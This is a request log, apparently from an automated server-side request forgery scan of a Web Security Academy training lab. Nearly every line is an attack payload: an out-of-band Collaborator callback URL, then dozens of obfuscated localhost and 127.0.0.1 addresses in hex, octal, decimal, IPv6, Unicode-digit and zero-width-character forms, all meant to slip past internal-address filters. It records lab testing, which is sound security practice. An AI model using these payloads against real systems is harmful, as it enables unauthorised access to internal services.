[2025-03-26T07:24:09.749247] method=POST param='stockApi' → https://	bcrozxku48s9zpbn1hp75dqft6zxnobd.oastify.com/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:45:57.362842] method=POST param='header: referer' → https://0x00000000/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:45:57.735119] method=POST param='header: referer' → https://0x100000000/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:45:58.107808] method=POST param='header: referer' → https://0x17f000001/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:45:58.516864] method=POST param='header: referer' → https://0x17f000002/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:45:58.890923] method=POST param='header: referer' → https://0x7F.0.0000.00000001/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:45:59.233306] method=POST param='header: referer' → https://0x7F.0.0000.0001/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:45:59.601313] method=POST param='header: referer' → https://0x7f.0x00.0x00.0x01/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:45:59.945774] method=POST param='header: referer' → https://0x7f.0x00.0x00.0x02/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:46:00.275912] method=POST param='header: referer' → https://0x7F.1/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:46:00.643517] method=POST param='header: referer' → https://0x7f000001/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:46:01.022486] method=POST param='header: referer' → https://0x7f000002/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:46:01.411051] method=POST param='header: referer' → https://127.0.0.1/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:46:01.785374] method=POST param='header: referer' → https://1㉗.0.0.1/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:46:02.160570] method=POST param='header: referer' → https://⑫7.0.0.1/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:46:02.530016] method=POST param='header: referer' → https://127.0.0.2/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:46:02.903278] method=POST param='header: referer' → https://1㉗.0.0.2/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:46:03.268018] method=POST param='header: referer' → https://⑫7.0.0.2/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:46:03.642058] method=POST param='header: referer' → https://127.000000000000000.1/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:46:04.024452] method=POST param='header: referer' → https://127.1/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:46:04.347217] method=POST param='header: referer' → https://2130706433/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:46:04.671865] method=POST param='header: referer' → https://21307064㉝/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:46:05.017511] method=POST param='header: referer' → https://2130706㊸3/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:46:05.386896] method=POST param='header: referer' → https://21㉚706433/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:46:05.721178] method=POST param='header: referer' → https://2⑬0706433/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:46:06.098837] method=POST param='header: referer' → https://㉑30706433/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:46:06.451372] method=POST param='header: referer' → https://㉑㉚⑦⓪⑥④㉝/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:46:06.817381] method=POST param='header: referer' → https://45080379393/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:46:07.201514] method=POST param='header: referer' → https://localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:46:07.591410] method=POST param='header: referer' → https://­localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:46:07.966759] method=POST param='header: referer' → https://͏localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:46:08.335033] method=POST param='header: referer' → https://᠋localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:46:08.715201] method=POST param='header: referer' → https://᠌localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:46:09.043142] method=POST param='header: referer' → https://᠍localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:46:09.384651] method=POST param='header: referer' → https://᠎localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:46:09.712310] method=POST param='header: referer' → https://᠏localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:46:10.047685] method=POST param='header: referer' → https://​localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:46:10.415677] method=POST param='header: referer' → https://⁠localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:46:10.793059] method=POST param='header: referer' → https://⁤localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:46:11.169258] method=POST param='header: referer' → https://localhoﬆ/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:46:11.557245] method=POST param='header: referer' → https://lo㎈host/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:46:11.932706] method=POST param='header: referer' → https://localhoﬅ/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:46:12.256395] method=POST param='header: referer' → http://[::]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:46:12.579712] method=POST param='header: referer' → http://[::1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:46:12.914838] method=POST param='header: referer' → http://[::ffff:0.0.0.0]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:46:13.287664] method=POST param='header: referer' → http://[::ffff:0000:0000]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:46:13.676015] method=POST param='header: referer' → http://[::ffff:7f00:1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:46:14.053785] method=POST param='header: referer' → http://[::ﬀﬀ:7f00:1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:46:14.419649] method=POST param='header: referer' → http://[0:0:0:0:0:ffff:127.0.0.1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:46:14.810844] method=POST param='header: referer' → http://[0:0:0:0:0:ffff:1㉗.0.0.1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:46:15.153459] method=POST param='header: referer' → http://[0:0:0:0:0:ffff:⑫7.0.0.1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:46:15.494737] method=POST param='header: referer' → http://[0:0:0:0:0:ﬀﬀ:127.0.0.1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:46:15.826278] method=POST param='header: referer' → http://[0000::1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:46:16.201684] method=POST param='header: referer' → http://[0000:0000:0000:0000:0000:0000:0000:0000]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:46:16.586696] method=POST param='header: referer' → http://[0000:0000:0000:0000:0000:0000:0000:0001]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:46:16.977678] method=POST param='header: referer' → http://@0/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:46:17.317615] method=POST param='header: referer' → http://\l\o\c\a\l\h\o\s\t/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:46:17.662060] method=POST param='header: referer' → http://stock.weliketoshop.net.local/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:46:17.991775] method=POST param='header: referer' → http://stock.weliketoshop.net.localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:46:18.325290] method=POST param='header: referer' → http://0/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:46:18.663020] method=POST param='header: referer' → http://0:80/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:46:19.055457] method=POST param='header: referer' → http://0.0.0.0/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:46:19.419307] method=POST param='header: referer' → http://0000.0000.0000.0000/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:46:19.768475] method=POST param='header: referer' → http://00000177.00000000.00000000.00000001/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:46:20.093881] method=POST param='header: referer' → http://0177.0000.0000.0001/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:46:20.420676] method=POST param='header: referer' → http://017700000001/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:46:20.787439] method=POST param='header: referer' → http://0⑰700000001/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:46:21.155973] method=POST param='header: referer' → http://0x00000000/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:46:21.501584] method=POST param='header: referer' → http://0x100000000/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:46:21.843599] method=POST param='header: referer' → http://0x17f000001/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:46:22.217636] method=POST param='header: referer' → http://0x17f000002/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
